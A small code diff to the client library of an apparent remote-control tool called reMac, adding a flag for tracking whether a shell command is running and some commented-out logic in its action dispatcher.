@@ -19,6 +19,8 @@ from apps.client.modules.mod_client_help import mod_client_help
 
 class reMac_libclient(reMac_libbase):
 
+    isShellCmdRunning = False
+
     reMacModules = {
         'hw': [mod_client_hello(), 'helloworld', 'Call HelloWorld module', 'hw'],
         'cb': [mod_client_clipboard(), 'clipboard', 'Call clipboard module', 'cb'],
@@ -80,6 +82,9 @@ class reMac_libclient(reMac_libbase):
         content = self.response
         result = content.get("result")
         action = content.get("action")
+
+        # if self.isShellCmdRunning == True:
+
         try:
             result = json.loads(result)
         except Exception:
@@ -103,6 +108,12 @@ class reMac_libclient(reMac_libbase):
         elif action.startswith("hw"):
             return self.reMacModules["hw"][0].run_mod(content)
         elif action.startswith("sh"):
+            # if(action == "sh"):
+            #     self.isShellCmdRunning = True
+            # else:
+            #     self.isShellCmdRunning = False
+                # if self.isShellCmdRunning == True:
+
             return self.reMacModules["sh"][0].run_mod(content)
         elif action.startswith("dl"):
             return self.reMacModules["dl"][0].run_mod(content)
